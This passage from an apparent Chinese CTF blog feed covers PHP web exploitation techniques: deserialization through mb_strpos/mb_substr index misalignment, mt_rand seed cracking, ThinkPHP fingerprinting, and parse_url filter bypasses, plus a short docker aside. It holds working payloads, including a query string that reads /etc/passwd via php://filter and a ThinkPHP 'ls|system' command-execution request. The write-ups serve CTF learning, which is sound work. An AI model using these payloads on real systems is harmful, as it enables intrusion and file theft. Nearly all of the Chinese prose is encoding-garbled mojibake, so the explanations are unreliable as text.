unserialize($ctf);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;Start_Funny_CTF!!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å®¡è®¡ä¸Šè¿°ä»£ç ï¼Œå‘ç°ä¼ å…¥å‚æ•°startå’Œreadï¼Œä¼šæ‹¼æ¥readå’Œrealfileçš„åºåˆ—åŒ–ã€‚</p><p>æ ¹æ®ä»£ç çŸ¥é“ï¼Œåœ¨è°ƒç”¨å‡½æ•°æˆªå–çš„æ—¶å€™æ˜¯ä»¥ â€œ[â€ å¼€å§‹çš„ï¼Œä½†æ˜¯readé‡Œé¢åˆä¸èƒ½æœ‰ â€œ[â€ï¼Œæ‰€ä»¥ä¸€å®šåªèƒ½æˆªå–[]å†…çš„åºåˆ—åŒ–ã€‚ä½†æ˜¯åªæœ‰å˜é‡startæ˜¯å¯æ§çš„ï¼Œå…¶å®ƒä¸å¯æ§ï¼Œçœ‹ä¼¼æ— è§£ï¼Œä½†å¯åˆ©ç”¨ä¸Šè¿°çš„æ¼æ´ï¼Œè®©å…¶å‘ç”Ÿé”™ä½ç´¢å¼•ï¼Œä»è€Œæ‰§è¡Œæˆ‘ä»¬è‡ªå·±ä¼ å…¥çš„åºåˆ—åŒ–åˆ—è¡¨ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœstart=gxngxngxnï¼Œåºåˆ—åŒ–ä¸ºï¼š</span><br><span class="line">O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;&#125;</span><br><span class="line"></span><br><span class="line">å¦‚æœæˆ‘ä»¬è‡ªå·±æ„é€ ä¸€ä¸ªåºåˆ—åŒ–è¡¨ä¼ å…¥ï¼Œstart=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;</span><br><span class="line">åºåˆ—åŒ–ç»“æœä¸ºï¼š</span><br><span class="line">O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:126:&quot;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;&quot;;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;&#125;</span><br><span class="line"></span><br><span class="line">ç›¸æ¯”è¾ƒï¼Œå‰é¢å¤šäº†ä¸€ä¸²ï¼š</span><br><span class="line">O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:126:&quot;</span><br><span class="line">åˆšå¥½å¤šäº†38ä¸ªå­—ç¬¦ï¼Œå°±å¯ä»¥é€šè¿‡ä¼ å‚readæ¥åˆ©ç”¨ä¸Šè¿°æ¼æ´ï¼Œè®©ä»–ä»¬é”™ä½38ä¸ªç´¢å¼•</span><br></pre></td></tr></table></figure><blockquote><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?read=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa&amp;start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹ï¼Œä¼ è¿›å»åï¼Œåœ¨ä¼ å…¥æˆªå–å‡½æ•°å‰ï¼Œå®ƒä»¬ä¼šç»„åˆæˆï¼š</p><p>%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa[O:9:â€œread_fileâ€:2:{s:5:â€œstartâ€;s:126:â€œO:9:â€œread_fileâ€:2:{s:5:â€œstartâ€;s:9:â€œgxngxngxnâ€;s:8:â€œfilenameâ€;s:55:â€œphp://filter/convert.base64-encode/resource=/etc/passwdâ€;}â€;s:8:â€œfilenameâ€;s:11:â€œ/etc/passwdâ€;}]</p><p>æ ¹æ®ä¸Šè¿°æ¼æ´ï¼Œmb_strposç´¢å¼•&quot;[â€œæ—¶ï¼Œä¼šç´¢å¼•åˆ° 12x4+2x2+1-1 = 52ï¼Œå³â€[&quot;ä¸‹æ ‡æ˜¯52</p><p>mb_substråœ¨æˆªå–æ—¶ï¼Œå°±ä¼šä»ä¸‹æ ‡ä¸º53çš„æˆªå–ã€‚ 53=12x1+1x2+1+38+1-1ï¼Œåˆšå¥½ç»•è¿‡äº†å‰é¢çš„38ä¸ªå­—ç¬¦ä¸²ï¼Œä»è€Œååºåˆ—åŒ–æˆ‘ä»¬è‡ªå·±ä¼ å…¥çš„åºåˆ—åŒ–è¡¨ã€‚</p></blockquote>]]></content>
    
    
    <summary type="html">ğŸ¥§mb_strposä¸mb_substré”™ä½ç´¢å¼•</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="webå§¿åŠ¿" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>éšæœºæ•°ç§å­çˆ†ç ´</title>
    <link href="https://m3x1.cn/posts/b4b5a295.html"/>
    <id>https://m3x1.cn/posts/b4b5a295.html</id>
    <published>2024-11-25T16:00:00.000Z</published>
    <updated>2024-12-02T08:49:30.846Z</updated>
    
    <content type="html"><![CDATA[<h2 id="éšæœºæ•°ç§å­çˆ†ç ´">éšæœºæ•°ç§å­çˆ†ç ´</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165931510.png" alt="image-20241116165931510"></p><p>åœ¨PHPä¸­ï¼Œå˜é‡ä»¥$ç¬¦å·å¼€å¤´ï¼Œåé¢æ‹¼æ¥å˜é‡åã€‚ä¸Šè¿°ä»£ç çš„åŸºæœ¬ å«ä¹‰æ˜¯:ä»$strå˜é‡ä¸­éšæœºå–32æ¬¡å­—ç¬¦(å­—ç¬¦å¯é‡å¤)ï¼Œå¹¶æ‹¼æ¥æˆå­—ç¬¦ ä¸²ï¼Œæœ€åå°†è¯¥å­—ç¬¦ä¸²èµ‹å€¼ç»™å˜é‡$passwordã€‚æ‰§è¡Œä»£ç åä¼šè¾“å‡º $passwordå˜é‡çš„å‰10ä¸ªå­—èŠ‚ï¼Œæ­¤æ—¶é€šè¿‡POSTè¯·æ±‚ä¼ é€’passwordå‚æ•°åˆ° æœåŠ¡ç«¯ï¼Œå¦‚æœpasswordå‚æ•°çš„å€¼ä¸$passwordå˜é‡çš„å€¼å®Œå…¨ç›¸ç­‰ï¼Œé‚£ä¹ˆ å°±ä¼šè¾“å‡ºflagã€‚</p><p>ç†è®ºä¸Šï¼Œå¦‚æœé€‰å–å­—ç¬¦çš„æ—¶å€™æ˜¯å®Œå…¨éšæœºçš„ï¼Œé‚£ä¹ˆå‡ ä¹ä¸å¯èƒ½å‡ºç° passwordå‚æ•°å€¼ä¸$passwordå˜é‡å€¼ç›¸ç­‰çš„æƒ…å†µ(æ¦‚ç‡æä½)ã€‚ä½†ç”±äº ä»£ç ä¸­ä½¿ç”¨mt_rand()å‡½æ•°æ¥ç”Ÿæˆéšæœºæ•°ï¼Œå› æ­¤å¦‚æœå¯ä»¥å¾—çŸ¥è¯¥å‡½æ•°ç”Ÿ æˆçš„ä¸€æ®µéšæœºæ•°åºåˆ—ï¼Œå°±å¯ä»¥é€šè¿‡å·¥å…·çˆ†ç ´å‡ºå…¶é€‰å–çš„éšæœºæ•°ç§å­ (è¯¥ç§å­ç”±$_Session[â€˜seedâ€™]å˜é‡ç”Ÿæˆ)ï¼Œä»è€Œé¢„æµ‹ä¹‹åçš„æ‰€æœ‰éšæœºæ•°åº åˆ—ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨php_mt_seedå·¥å…·æ¥çˆ†ç ´éšæœºæ•°ç§å­ã€‚è¯¥å·¥å…·çš„ ä¸‹è½½åœ°å€ä¸º:<a href="https://www.openwall.com/php_mt_seed/php_mt_seed-">https://www.openwall.com/php_mt_seed/php_mt_seed-</a> 4.0.tar.gz</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165647076.png" alt="image-20241116165647076"></p><p>è®¿é—®é¢˜ç›®é¡µé¢ï¼Œå¯å¾—åˆ°å‰10ä¸ªå­—èŠ‚çš„éšæœºå­—ç¬¦ï¼Œå°†è¾“å‡ºçš„éšæœºå­—ç¬¦è½¬æ¢ä¸ºphp_mt_seedå¯è¯†åˆ«çš„æ•°æ®æ ¼å¼ã€‚ä½¿ç”¨</p><p>Python3è„šæœ¬è¿›è¡Œè½¬æ¢:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165703575.png" alt="image-20241116165703575"></p><p>str1å˜é‡çš„å€¼å°±æ˜¯PHPä»£ç ä¸­çš„$strçš„å€¼ï¼Œstr2å˜é‡çš„å€¼å°±æ˜¯PHPä»£ç ä¸­ è¾“å‡ºçš„$passwordçš„å‰10ä¸ªå­—èŠ‚ã€‚è¿™æ®µä»£ç çš„åŸºæœ¬ä½œç”¨å°±æ˜¯å°†$password ä¸­çš„å‰10ä¸ªå­—èŠ‚(å³å˜é‡str2)è¿›è¡Œå®šä½ï¼Œå¾—åˆ°å…¶åœ¨str1ä¸­çš„å…·ä½“ä¸‹æ ‡ ä½ç½®ï¼Œç„¶åæŒ‰ç…§å…·ä½“æ ¼å¼è¾“å‡ºã€‚ä»¥str2ä¸­çš„ç¬¬ä¸€ä¸ªå­—æ¯Aä¸ºä¾‹ï¼Œå­—æ¯A åœ¨å˜é‡str1ä¸­çš„ä¸‹æ ‡æ˜¯36(å­—ç¬¦ä¸²ä¸‹æ ‡ä»0å¼€å§‹)</p><p>å°†è¾“å‡ºçš„å­—ç¬¦è¾“å…¥åˆ°ç¼–è¯‘å¥½çš„php_mt_seedå·¥å…·ä¸­ï¼Œå…·ä½“æŒ‡ä»¤å¦‚ä¸‹:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165734372.png" alt="image-20241116165734372"></p><p>æœ€ç»ˆæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªéšæœºæ•°ç§å­ 19290735(PHP7.1)ã€‚åœ¨è¿™ä¸€æ­¥éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œmt_rand()å‡½æ•°æœ¬èº«ç¡® å®å­˜åœ¨é—®é¢˜ï¼Œä½†æ˜¯æ ¹æ®PHPç‰ˆæœ¬çš„ä¸åŒï¼Œå…¶ç”Ÿæˆçš„éšæœºæ•°ä¼šç•¥æœ‰åŒºåˆ«ã€‚ æ‰€ä»¥ï¼Œåœ¨å®é™…é¢˜ç›®ä¸­ä¸€å®šè¦æ³¨æ„PHPç‰ˆæœ¬é—®é¢˜ï¼Œä¸èƒ½è„±ç¦»PHPç‰ˆæœ¬æ¥åš é¢˜ã€‚</p><p>åˆ©ç”¨å¾—åˆ°çš„éšæœºæ•°ç§å­ç¼–å†™PHPè„šæœ¬ï¼Œå¦‚ä¸‹æ‰€ç¤º:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165751773.png" alt="image-20241116165751773"></p><p>å°è¯•å°†è¯¥ç»“æœæäº¤ç»™æœåŠ¡ç«¯ï¼Œå³å¯æˆåŠŸå¾—åˆ°flagã€‚</p><p>æœ¬è´¨ä¸Šæ˜¯å› ä¸ºmt_rand()å‡½æ•°çš„ä¸å®‰å…¨æ€§å¯¼è‡´çš„ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡® ä»¥ä¸‹å‡ ç‚¹:</p><ol><li>mt_rand()å‡½æ•°çš„ä¸å®‰å…¨æ€§æ˜¯è€ƒç‚¹çš„æ ¸å¿ƒã€‚</li></ol><p>2)è¦çˆ†ç ´éšæœºæ•°ç§å­ï¼Œé¦–å…ˆéœ€è¦å¾—åˆ°mt_rand()å‡½æ•°ç”Ÿæˆçš„éšæœºæ•°åº</p><p>åˆ—ã€‚</p><p>3)mt_rand()å‡½æ•°ç”Ÿæˆçš„éšæœºæ•°åºåˆ—å¯èƒ½ä»¥ä¸åŒçš„å½¢å¼è¡¨ç°(ä¾‹å¦‚ç”Ÿæˆ éšæœºå­—ç¬¦ä¸²)ã€‚</p><p>4)ç›¸åŒå‡½æ•°åœ¨ä¸åŒçš„PHPç‰ˆæœ¬(å¤§ç‰ˆæœ¬)ä¸­çš„å®ç°ä»£ç å¯èƒ½æ˜¯ä¸ä¸€æ · çš„ã€‚ä¾‹å¦‚ï¼Œåœ¨PHP7å’ŒPHP5ä¸­ï¼Œmt_rand()å‡½æ•°çš„å®ç°ç®—æ³•æ˜¯å®Œå…¨ä¸åŒ çš„ã€‚</p><p>5)è®¡ç®—æœºä¸­ä¸å­˜åœ¨çœŸæ­£çš„éšæœºæ•°ï¼Œè¿™æ˜¯mt_rand()å‡½æ•°å­˜åœ¨å®‰å…¨é—®é¢˜çš„ æ ¹æœ¬åŸå› ã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§éšæœºæ•°ç§å­çˆ†ç ´</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="webå§¿åŠ¿" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>tpæ¼æ´</title>
    <link href="https://m3x1.cn/posts/3b315222.html"/>
    <id>https://m3x1.cn/posts/3b315222.html</id>
    <published>2024-11-24T16:00:00.000Z</published>
    <updated>2024-12-02T09:04:15.023Z</updated>
    
    <content type="html"><![CDATA[<h1>tpæ¼æ´</h1><h2 id="ä¸€-è¯†åˆ«tpæ¡†æ¶-æŒ‡çº¹">ä¸€-è¯†åˆ«tpæ¡†æ¶(æŒ‡çº¹)</h2><h3 id="1-1-iocåˆ¤æ–­">1.1 iocåˆ¤æ–­</h3><p>/favicon.ico</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20516b1e8de85b6b95343771b66b44df.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125193711067.png" alt="image-20241125193711067"></p><h3 id="1-2æŠ¥é”™">1.2æŠ¥é”™</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1c8c509ef3f760f24376d38f6a7625c8.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3b4ccc2eacbbf6163c0ef584d7aeb544.png" alt="img"></p><p>æˆ–è€… /index.php/index/index/1</p><h3 id="1-3é”™è¯¯ä¼ å‚">1.3é”™è¯¯ä¼ å‚</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/479046ae0c8bf91e2d32d17acc474db9.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ebf2fd7c4ce6bf62b49083a7085bd599.png" alt="img"></p><h3 id="1-4ç‰¹æ®ŠæŒ‡çº¹å‡ºç°logo">1.4ç‰¹æ®ŠæŒ‡çº¹å‡ºç°logo</h3><p>/?c=4e5e5d7364f443e28fbf0d3ae744a59a</p><p>/4e5e5d7364f443e28fbf0d3ae744a59a</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3ddc4ccf08674da045f360091d24546e.png" alt="img"></p><p>p3.1å’Œ3.2ç‰ˆæœ¬</p><p>4e5e5d7364f443e28fbf0d3ae744a59a-index.html</p><h3 id="1-5-bodyç‰¹å¾">1.5 bodyç‰¹å¾</h3><p>bodyé‡Œæœ‰&quot;åå¹´ç£¨ä¸€å‰‘&quot; æˆ–è€…&quot;ThinkPHP&quot;</p><h3 id="1-6æ’ä»¶">1.6æ’ä»¶</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0684f3dbf50af3128a16c0a775d03eb4.png" alt="img"></p><h2 id="äºŒã€åˆ©ç”¨æ–¹æ³•">äºŒã€åˆ©ç”¨æ–¹æ³•</h2><p>æ•°æ®é€šè¿‡ç«–çº¿åˆ†å¼€, å‰é¢ä¸ºå‚æ•°, åé¢ä¸ºå‡½æ•°ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?cacheTime=0&amp;isCache=ls|system  </span><br><span class="line">/index.php/?cacheTime=0&amp;isCache=ls|system   #ä¸Šé¢ä¸è¡Œå°±æ¢ä¸‹é¢</span><br></pre></td></tr></table></figure><p>æ ¹æ® thinkphp çš„è·¯ç”±è§„åˆ™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç”±äºThinkPHPå­˜åœ¨ä¸¤ç§è·¯ç”±è§„åˆ™ï¼Œå¦‚ä¸‹æ‰€ç¤º</span><br><span class="line">http://serverName/index.php/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/å‚æ•°å€¼...]</span><br><span class="line">å¦‚æœä¸æ”¯æŒPATHINFOçš„æœåŠ¡å™¨å¯ä»¥ä½¿ç”¨å…¼å®¹æ¨¡å¼è®¿é—®å¦‚ä¸‹ï¼š</span><br><span class="line">http://serverName/index.php?s=/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/å‚æ•°å€¼...]</span><br><span class="line">ä¹Ÿå¯é‡‡ç”¨ index.php/a/b/c/$&#123;code&#125;ä¸€ä¸‹å½¢å¼ã€‚</span><br></pre></td></tr></table></figure><p>è®¿é—® <code>/index.php/index/index</code>ï¼Œèƒ½å¤Ÿèµ°åˆ°é¢˜ç›®ç»™å‡ºçš„<code>Index\index</code>é‡Œã€‚</p><p>æ‰€ä»¥ä¸€èˆ¬è¦å…ˆåŠ ä¸Šè·¯ç”±è·¯å¾„ã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§tpæ¼æ´</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="webå§¿åŠ¿" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>dockerä¿å­˜å’Œæ‰“åŒ…é•œåƒ</title>
    <link href="https://m3x1.cn/posts/5721bfe4.html"/>
    <id>https://m3x1.cn/posts/5721bfe4.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-02T09:09:58.908Z</updated>
    
    <content type="html"><![CDATA[<h2 id="dockerä¿å­˜å’Œæ‰“åŒ…é•œåƒ">dockerä¿å­˜å’Œæ‰“åŒ…é•œåƒ</h2><p>ä½œç”¨ï¼šåœ¨ç°åœ¨å®¹å™¨é•œåƒä¸Šä¿å­˜é•œåƒè¿›è¡Œæ‰“åŒ…ï¼Œåœ¨å¦ä¸€å°æœåŠ¡ä¸Šä½¿ç”¨ï¼›æˆ–ç°æœ‰çš„å®¹å™¨å®‰è£…äº†ä¸€äº›åº“ï¼Œé…ç½®äº†å¼€å‘ç¯å¢ƒï¼Œéœ€è¦ä¿å­˜ä¸‹è½½ï¼Œä¸‹æ¬¡åŠ è½½åç›´æ¥ä½¿ç”¨ã€‚</p><h4 id="1-1-é¦–å…ˆæŸ¥çœ‹ä¸‹ç°æœ‰å®¹å™¨é•œåƒï¼ˆç›®çš„æ˜¯æŸ¥è¯¢éœ€è¦ä¿å­˜é•œåƒçš„IDï¼‰">1.1 é¦–å…ˆæŸ¥çœ‹ä¸‹ç°æœ‰å®¹å™¨é•œåƒï¼ˆç›®çš„æ˜¯æŸ¥è¯¢éœ€è¦ä¿å­˜é•œåƒçš„IDï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><h4 id="1-2-æ¥ä¸‹æ¥ç”¨commitå‚æ•°è¿›è¡Œä¿å­˜é•œåƒï¼ˆç²¾ç®€ç‰ˆï¼‰">1.2 æ¥ä¸‹æ¥ç”¨commitå‚æ•°è¿›è¡Œä¿å­˜é•œåƒï¼ˆç²¾ç®€ç‰ˆï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit  7ca736d99653    yolov5:v6.2</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ7ca736d99653 æ˜¯éœ€è¦ä¿å­˜é•œåƒçš„IDï¼Œåˆšæ‰ç”¨docker ps -a æŸ¥è¯¢åˆ°çš„ã€‚</p><h2 id="æ‰“åŒ…tar">æ‰“åŒ…tar</h2><p>ä½¿ç”¨saveå‚æ•°è¿›è¡Œæ‰“åŒ…ï¼Œæ ¼å¼å¦‚ï¼šdocker save -o  taræ–‡ä»¶åç§°     é•œåƒREPOSITORY:TAG</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o yolov5-v6.2.tar yolov5:v6.2</span><br></pre></td></tr></table></figure><p>å…¶ä¸­yolov5:v6.2 æ˜¯éœ€è¦ä¿å­˜é•œåƒçš„REPOSITORYã€å’ŒTAGï¼›ä¹Ÿæ˜¯ä¸Šé¢ä¿å­˜çš„é•œåƒåç§°ã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§dockerä¿å­˜å’Œæ‰“åŒ…é•œåƒ</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="å…¶ä»–å§¿åŠ¿" scheme="https://m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>parse_urlå‡½æ•°</title>
    <link href="https://m3x1.cn/posts/f885edb3.html"/>
    <id>https://m3x1.cn/posts/f885edb3.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-02T09:02:40.921Z</updated>
    
    <content type="html"><![CDATA[<p>parse_urlå‡½æ•°<br>ä½œç”¨ï¼šparse_url â€” è§£æ URLï¼Œè¿”å›å…¶ç»„æˆéƒ¨åˆ†</p><p>mixed parse_url ( string $url [, int $component = -1 ] )<br>æœ¬å‡½æ•°è§£æä¸€ä¸ª URL å¹¶è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å«åœ¨ URL ä¸­å‡ºç°çš„å„ç§ç»„æˆéƒ¨åˆ†ã€‚</p><p>å‚æ•°ï¼š<br>urlï¼šè¦è§£æçš„ URLã€‚æ— æ•ˆå­—ç¬¦å°†ä½¿ç”¨ _ æ¥æ›¿æ¢ã€‚</p><p>componentï¼š<br>æŒ‡å®š PHP_URL_SCHEMEã€ PHP_URL_HOSTã€ PHP_URL_PORTã€ PHP_URL_USERã€ PHP_URL_PASSã€ PHP_URL_PATHã€PHP_URL_QUERY æˆ– PHP_URL_FRAGMENT çš„å…¶ä¸­ä¸€ä¸ªæ¥è·å– URL ä¸­æŒ‡å®šçš„éƒ¨åˆ†çš„ stringã€‚ ï¼ˆé™¤äº†æŒ‡å®šä¸ºPHP_URL_PORT åï¼Œå°†è¿”å›ä¸€ä¸ª integer çš„å€¼ï¼‰ã€‚</p><p>å¯¹ä¸¥é‡ä¸åˆæ ¼çš„ URLï¼Œparse_url() å¯èƒ½ä¼šè¿”å› FALSE ï¼ˆCTFå¸¸ç”¨ è¿”å›å€¼False ç”¨äºé€ƒé€¸åˆ¤æ–­ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DEMO</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;</span><br><span class="line">ç»“æœ----------------------------------------------------------------------------------------------------</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬è¿˜è¾“å‡ºäº†å½“å‰$urlçš„PHP_URL_PATH å‘ç°æ˜¯ /path<br>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬è¿™é‡ŒæŠŠ$urlä¸­çš„/pathå»æ‰ å‘ç°è¾“å‡ºçš„åˆ™ä¸º NULL</p><p>tipsï¼šparse_url()ä¼šæŠŠ//è®¤ä¸ºæ˜¯ç›¸å¯¹è·¯å¾„ï¼ˆ5.4.7ä»¥å‰ï¼‰<br>å¦‚æœæˆ‘ä»¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;//www.example.com/path?googleguy=googley&#x27;;</span><br><span class="line"> </span><br><span class="line">// åœ¨ 5.4.7 ä¹‹å‰è¿™ä¼šè¾“å‡ºè·¯å¾„ &quot;//www.example.com/path&quot;</span><br><span class="line">var_dump(parse_url($url));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="2016asisctfçš„ä¸€é“webé¢˜-DEMO1">2016asisctfçš„ä¸€é“webé¢˜ DEMO1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$data = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]); </span><br><span class="line">var_dump($data);</span><br><span class="line">$filter=array(&quot;aaa&quot;,&quot;qqqq&quot;);</span><br><span class="line">foreach($filter as $f)</span><br><span class="line">&#123; </span><br><span class="line">if(preg_match(&quot;/&quot;.$f.&quot;/i&quot;, $data[&#x27;query&#x27;]))</span><br><span class="line">&#123; </span><br><span class="line">die(&quot;Attack Detected&quot;); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8493b71d2534228680bc92134d48817d.png" alt="img"></p><p>è¿™é‡Œqueryä¸­çš„å‚æ•°æœ‰aaa è¢«preg_matchåŒ¹é…åˆ° æ‰€ä»¥æ‹¦æˆªäº†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/260d79001d32b5306fb9f046839ee920.png" alt="img"></p><p>è¿™é‡Œtest.phpå‰é¢åŠ äº†ä¸€ä¸ª/ å¯¼è‡´æŠŠtest.php? è®¤ä¸ºæˆäº†host ç›¸å¯¹çš„æ¥è¯´ /aaa/xxx ä¹Ÿå°±æˆä¸ºäº†è·¯å¾„ è¿™ä¹Ÿå¯ä»¥è¯´æ˜¯ä¸€ä¸ªç»•è¿‡å§</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a6c48f242ca38058c92a1bc195e6c365.png" alt="img"></p><p>è¿™é‡Œtest.phpå‰é¢å†å¤šåŠ äº†ä¸€ä¸ª/ å¯¼è‡´ ä¸¥é‡ä¸åˆæ ¼çš„ URLï¼Œparse_url() è¿”å›FALSE è¿™ä¸ªæ˜¯é€šç”¨çš„ç»•è¿‡æ–¹æ³•</p>]]></content>
    
    
    <summary type="html">ğŸ¥§parse_urlå‡½æ•°</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="webå§¿åŠ¿" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡»</title>
    <link href="https://m3x1.cn/posts/575ed4b2.html"/>
    <id>https://m3x1.cn/posts/575ed4b2.html</id>
